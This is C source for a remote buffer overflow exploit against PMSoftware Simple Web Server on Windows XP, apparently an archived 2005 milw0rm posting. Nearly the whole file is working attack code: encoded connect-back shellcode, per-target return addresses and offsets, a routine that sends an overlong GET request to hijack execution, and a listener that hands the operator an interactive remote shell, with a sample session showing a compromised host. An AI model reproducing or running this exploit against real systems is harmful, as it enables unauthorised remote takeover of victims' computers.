/*
 *
 * PMSoftware Simple Web Server Buffer Overflow Exploit
 * 3 targets
 *
 * cybertronic[at]gmx[dot]net
 * 04/25/2005
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * Usage: ./PMSoftwareSimpleWebServer_expl -h <tip> -p <tport> -l <cbip> -c <cbport> -t <target>
 *         0 WinXP Home SP1 GER [0x71a17bfb] [pad=213] [offset=222]
 *         1 WinXP Prof SP1 GER [0x71a17bfb] [pad=216] [offset=225]
 *         2 WinXP Prof SP2 GER [0x71a19372] [pad=215] [offset=224]
 *
 * [ cybertronic @ PM ] $ ./PMSoftwareSimpleWebServer_expl -h 192.168.2.103 -p 80 -l 192.168.2.102 -c 1337 -t 1
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * --[ connecting to 192.168.2.103:80...done!
 * --[ exploiting WinXP Pro SP1 GER
 * --[ ret: 0x71a17bfb [ jmp esp in ws2_32.dll ]
 * --[ sending GET request [ 543 bytes ]...done!
 * --[ starting reverse handler [port: 1337]...done!
 * --[ incomming connection from:  192.168.2.103
 * --[ b0x pwned - h4ve phun
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\PMSoftware>
 *
 */


#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>

#define PORT 80

#define RED		"\E[31m\E[1m"
#define GREEN	"\E[32m\E[1m"
#define YELLOW	"\E[33m\E[1m"
#define BLUE	"\E[34m\E[1m"
#define NORMAL	"\E[m"

/*
 *
 * prototypes
 *
 */

int connect_to_remote_host ( char* tip, unsigned short tport );
int exploit ( int s, unsigned long xoredip, unsigned short xoredcbport, int targ );
int shell ( int s, char* tip, unsigned short cbport );

void header ();
void start_reverse_handler ( unsigned short cbport );
void usage ( char* name );

/*********************
* Windows Shellcode *
*********************/

/*
 * Type : connect back shellcode
 * Length: 316 bytes
 * CBIP : reverseshell[111] ( ^ 0x99999999 )
 * CBPort: reverseshell[118] ( ^ 0x9999 )
 *
 */

unsigned char reverseshell[] =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
"\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
"\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
"\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
"\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
"\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
"\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
"\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
"\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
"\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
"\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
"\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
"\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
"\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
"\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0";

/*
 *
 * structures
 *
 */

typedef struct _args {
	char* tip;
	char* lip;
    int tport;
	int lport;
	int target;
} args;

struct targets {
	int  num;
	char name[64];
	unsigned long ret;
	int padding;
	int offset;
}
target[]= {
	{ 0, "WinXP Home SP1 GER", 0x71a17bfb, 213, 222 },
	{ 1, "WinXP Prof SP1 GER", 0x71a17bfb, 216, 225 },
	{ 2, "WinXP Prof SP2 GER", 0x71a19372, 215, 224 } //works only in conjunction with SoftIce :: stack guard is disabled somehow
};

/*
 *
 * functions
 *
 */

int
connect_to_remote_host ( char* tip, unsigned short tport )
{
	int s;
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

    memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
    if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		printf ( "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_port = htons ( tport );
    remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
    if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
    {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ connecting to %s:%u...", tip, tport  );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( "failed!\n" );
		exit ( 1 );
	}
	printf ( "done!\n" );
	return ( s );
}

int
exploit ( int s, unsigned long xoredip, unsigned short xoredcbport, int targ )
{
	char in[2048], request[1024];
	
	printf ( "--[ exploiting WinXP Pro SP1 GER\n" );
	printf ( "--[ ret: 0x%08x [ jmp esp in ws2_32.dll ]\n", target[targ].ret );
	
	memcpy ( &reverseshell[111], &xoredip, 4);
	memcpy ( &reverseshell[118], &xoredcbport, 2);
	
	bzero ( &request, sizeof ( request ) );
	request[0] = 0x47;
	request[1] = 0x45;
	request[2] = 0x54;
	request[3] = 0x20;
	request[4] = 0x2f;

	memset ( request + 5, 0x41, target[targ].padding );
	strncat ( request, ( unsigned char* ) &target[targ].ret, 4 );
	memcpy ( request + target[targ].offset, reverseshell, sizeof ( reverseshell ) - 1 );
	strcat ( request, "\r\n" );

	printf ( "--[ sending GET request [ %d bytes ]...", strlen ( request ) );
	if ( write ( s, request, strlen ( request ) ) <= 0 )
	{
		printf ( "failed!\n" );
		return ( 1 );
	}
	printf ( "done!\n" );
	return ( 0 );
}

int
send_head ( int s )
{
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}

void
parse_arguments ( int argc, char* argv[], args* argp )
{
	int i = 0;
	
	while ( ( i = getopt ( argc, argv, "h:p:l:c:t:" ) ) != -1 )
	{
		switch ( i )
		{
			case 'h':
				argp->tip = optarg;
				break;
			case 'p':
				argp->tport = atoi ( optarg );
				break;
			case 'l':
				argp->lip = optarg;
				break;
			case 'c':
                argp->lport = atoi ( optarg );
	            break;
			case 't':
                argp->target = strtoul ( optarg, NULL, 16 );
	            break;
			case ':':
			case '?':
			default:
				usage ( argv[0] );
	    }
    }

    if ( argp->tip == NULL || argp->tport < 1 || argp->tport > 65535 || argp->lip == NULL || argp->lport < 1 || argp->lport > 65535 ||  argp->target < 0 || argp->target > 2 )
		usage ( argv[0] );
}

void
start_reverse_handler ( unsigned short cbport )
{
	int s1, s2;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );
	
	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( "--[ starting reverse handler [port: %u]...", cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( "listen failed!\n" );
		exit ( 1 );
	}
	printf ( "done!\n" );
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
	{
		printf ( "accept failed!\n" );
		exit ( 1 );
	}
	close ( s1 );
	printf ( "--[ incomming connection from:\t%s\n", inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

void
usage ( char* name )
{
	int i;

	printf ( "Usage: %s -h <tip> -p <tport> -l <cbip> -c <lport> -t <target>\n", name );
	for ( i = 0; i < 3; i++ )
		printf ( "\t%d %s [0x%08x] [pad=%d] [offset=%d]\n", target[i].num, target[i].name, target[i].ret, target[i].padding, target[i].offset );
    exit ( 1 );
}

int
main ( int argc, char* argv[] )
{
	int s, targ, i;
	unsigned long xoredip;
	unsigned short cbport, xoredcbport;
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;
	args myargs;

	system ( "clear" );
	header ();
	parse_arguments ( argc, argv, &myargs );
	s = connect_to_remote_host ( myargs.tip, myargs.tport );
	
	xoredip = inet_addr ( myargs.lip ) ^ ( unsigned long ) 0x99999999;
	xoredcbport = htons ( myargs.lport ) ^ ( unsigned short ) 0x9999;

	if ( exploit ( s, xoredip, xoredcbport, myargs.target ) == 1 )
	{
		printf ( "exploitation FAILED!\n" );
		exit ( 1 );
	}
	start_reverse_handler ( myargs.lport );
}


// milw0rm.com [2005-04-24]
